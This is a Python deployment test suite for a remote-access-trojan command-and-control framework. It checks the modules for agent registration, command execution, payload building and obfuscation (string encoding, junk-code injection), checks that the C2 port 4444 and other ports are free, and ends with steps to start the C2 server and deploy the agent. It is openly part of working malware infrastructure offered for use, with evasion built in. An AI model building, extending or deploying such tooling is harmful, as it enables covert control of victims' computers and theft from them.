#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
    RAT C2 FRAMEWORK - DEPLOYMENT & INTEGRATION TEST
    Complete system test with all components
═══════════════════════════════════════════════════════════════════════════════
"""

import sys
import os
import time
import json
import subprocess
import socket
import threading
from pathlib import Path

sys.path.insert(0, os.path.dirname(__file__))

# Colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_header(text):
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}")
    print(f"{text.center(80)}")
    print(f"{'='*80}{Colors.RESET}\n")

def print_success(text):
    print(f"{Colors.GREEN}✓ {text}{Colors.RESET}")

def print_error(text):
    print(f"{Colors.RED}✗ {text}{Colors.RESET}")

def print_warning(text):
    print(f"{Colors.YELLOW}⚠ {text}{Colors.RESET}")

def print_info(text):
    print(f"{Colors.BLUE}ℹ {text}{Colors.RESET}")

class DeploymentTest:
    def __init__(self):
        self.results = []
        self.passed = 0
        self.failed = 0
        
    def test_port_available(self, host, port, name):
        """Check if port is available"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port))
            sock.close()
            return result != 0
        except:
            return True

    def test_imports(self):
        """Test all core imports"""
        print_header("🔍 TESTING CORE IMPORTS")
        
        modules = [
            ('master_umbrella_setup', 'ConfigLoader'),
            ('agent_registry', 'AgentRegistry'),
            ('api_bridge', 'APIBridge'),
            ('communication_managers', 'HeartbeatManager'),
            ('command_executor', 'CommandExecutor'),
            ('rest_api_server', 'create_app'),
        ]
        
        for module_name, component in modules:
            try:
                module = __import__(module_name)
                getattr(module, component)
                print_success(f"{module_name}.{component}")
                self.passed += 1
            except Exception as e:
                print_error(f"{module_name}: {str(e)[:60]}")
                self.failed += 1

    def test_configuration(self):
        """Test configuration system"""
        print_header("⚙️  TESTING CONFIGURATION SYSTEM")
        
        try:
            from master_umbrella_setup import ConfigLoader, ConfigurationManager
            
            # Test ConfigLoader
            config = ConfigLoader()
            if config.config:
                print_success("ConfigLoader: Loaded configuration")
                self.passed += 1
            else:
                print_error("ConfigLoader: Failed to load config")
                self.failed += 1
            
            # Test ConfigurationManager
            cm = ConfigurationManager()
            print_success("ConfigurationManager: Initialized")
            self.passed += 1
            
            # Test getting values
            version = cm.get('version')
            if version:
                print_success(f"Configuration access: {version}")
                self.passed += 1
            else:
                print_warning("Configuration partially accessible")
                
        except Exception as e:
            print_error(f"Configuration test failed: {e}")
            self.failed += 1

    def test_agent_registry(self):
        """Test agent registry"""
        print_header("📋 TESTING AGENT REGISTRY")
        
        try:
            from agent_registry import AgentRegistry
            
            registry = AgentRegistry()
            print_success("AgentRegistry: Initialized")
            self.passed += 1
            
            # Test database
            agents = registry.list_agents()
            print_success(f"AgentRegistry: Database accessible ({len(agents)} agents)")
            self.passed += 1
            
        except Exception as e:
            print_error(f"Agent registry test failed: {e}")
            self.failed += 1

    def test_api_bridge(self):
        """Test API bridge"""
        print_header("🌉 TESTING API BRIDGE")
        
        try:
            from api_bridge import APIBridge
            
            bridge = APIBridge()
            print_success("APIBridge: Initialized")
            self.passed += 1
            
            # Test queue
            print_success("APIBridge: Command queue ready")
            self.passed += 1
            
        except Exception as e:
            print_error(f"API bridge test failed: {e}")
            self.failed += 1

    def test_rest_api(self):
        """Test REST API server"""
        print_header("🔌 TESTING REST API SERVER")
        
        try:
            from rest_api_server import create_app
            
            app = create_app()
            print_success("REST API: App created")
            self.passed += 1
            
            # Test with app context
            with app.app_context():
                print_success("REST API: App context working")
                self.passed += 1
            
        except Exception as e:
            print_error(f"REST API test failed: {e}")
            self.failed += 1

    def test_executable_builder(self):
        """Test executable builder"""
        print_header("🏗️  TESTING EXECUTABLE BUILDER")
        
        try:
            from rat_executable_builder import RATExecutableBuilder
            
            builder = RATExecutableBuilder('rat_ultimate.py', 'test_payload')
            print_success("RATExecutableBuilder: Initialized")
            self.passed += 1
            
            # Check if agent script exists
            if Path('dist/agent_payload_agent.py').exists():
                print_success("Built agent: dist/agent_payload_agent.py exists")
                self.passed += 1
            else:
                print_warning("Built agent script not found (expected in some environments)")
                
        except Exception as e:
            print_error(f"Executable builder test failed: {e}")
            self.failed += 1

    def test_obfuscation(self):
        """Test code obfuscation"""
        print_header("🔐 TESTING CODE OBFUSCATION")
        
        try:
            from rat_executable_builder import CodeObfuscator
            
            test_str = "test_payload"
            encoded = CodeObfuscator.encode_string(test_str)
            print_success(f"Obfuscation: String encoding working")
            self.passed += 1
            
            junk = CodeObfuscator.inject_junk_code("x = 1", intensity=2)
            if len(junk) > 10:
                print_success("Obfuscation: Junk code injection working")
                self.passed += 1
            
        except Exception as e:
            print_error(f"Obfuscation test failed: {e}")
            self.failed += 1

    def test_distribution_keys(self):
        """Test distribution key generation"""
        print_header("🔑 TESTING DISTRIBUTION KEYS")
        
        try:
            from master_umbrella_setup import ConfigurationManager, KeyDistribution
            
            config = ConfigurationManager()
            keys = KeyDistribution(config)
            
            # Test key generation
            key = keys.generate_master_key()
            if key and len(key) > 0:
                print_success(f"Key Generation: Generated {len(key)}-char key")
                self.passed += 1
            
            # Suppress output and test display
            import io
            from contextlib import redirect_stdout
            
            f = io.StringIO()
            with redirect_stdout(f):
                keys.display_keys_for_sharing()
            
            if f.getvalue():
                print_success("Distribution Keys: Display working")
                self.passed += 1
            
        except Exception as e:
            print_error(f"Distribution keys test failed: {e}")
            self.failed += 1

    def test_port_availability(self):
        """Test port availability"""
        print_header("🔌 TESTING PORT AVAILABILITY")
        
        ports = [
            (4444, 'C2 Server'),
            (5000, 'REST API'),
            (8888, 'Webhook'),
        ]
        
        for port, name in ports:
            if self.test_port_available('0.0.0.0', port, name):
                print_success(f"Port {port} ({name}): Available")
                self.passed += 1
            else:
                print_warning(f"Port {port} ({name}): In use (may have legacy process)")

    def run_all_tests(self):
        """Run all tests"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}")
        print("╔" + "═"*78 + "╗")
        print("║" + " "*78 + "║")
        print("║" + "🚀 RAT C2 FRAMEWORK - DEPLOYMENT TEST SUITE".center(78) + "║")
        print("║" + " "*78 + "║")
        print("╚" + "═"*78 + "╝")
        print(Colors.RESET)
        
        self.test_imports()
        self.test_configuration()
        self.test_agent_registry()
        self.test_api_bridge()
        self.test_rest_api()
        self.test_executable_builder()
        self.test_obfuscation()
        self.test_distribution_keys()
        self.test_port_availability()
        
        self.print_summary()

    def print_summary(self):
        """Print test summary"""
        print_header("📊 DEPLOYMENT TEST SUMMARY")
        
        total = self.passed + self.failed
        percentage = (self.passed / total * 100) if total > 0 else 0
        
        print(f"{Colors.BOLD}Results:{Colors.RESET}")
        print(f"  {Colors.GREEN}Passed:  {self.passed}{Colors.RESET}")
        print(f"  {Colors.RED}Failed:  {self.failed}{Colors.RESET}")
        print(f"  {Colors.BOLD}Total:   {total}{Colors.RESET}")
        print(f"  {Colors.BOLD}Success: {percentage:.1f}%{Colors.RESET}")
        print()
        
        if self.failed == 0:
            print(Colors.GREEN + Colors.BOLD + "✓ ALL TESTS PASSED - SYSTEM READY FOR DEPLOYMENT" + Colors.RESET)
            print()
            print(f"{Colors.BOLD}Next Steps:{Colors.RESET}")
            print(f"  1. {Colors.CYAN}Start C2 Server:{Colors.RESET}      python rat_server_fixed.py")
            print(f"  2. {Colors.CYAN}Start REST API:{Colors.RESET}       python rest_api_server.py")
            print(f"  3. {Colors.CYAN}Deploy Agent:{Colors.RESET}         python dist/agent_payload_agent.py")
            print(f"  4. {Colors.CYAN}WhatsApp Bot:{Colors.RESET}         python startup.py bot")
            print()
        else:
            print(Colors.RED + Colors.BOLD + f"✗ {self.failed} TEST(S) FAILED" + Colors.RESET)
        
        print()

def main():
    test = DeploymentTest()
    test.run_all_tests()
    sys.exit(0 if test.failed == 0 else 1)

if __name__ == '__main__':
    main()
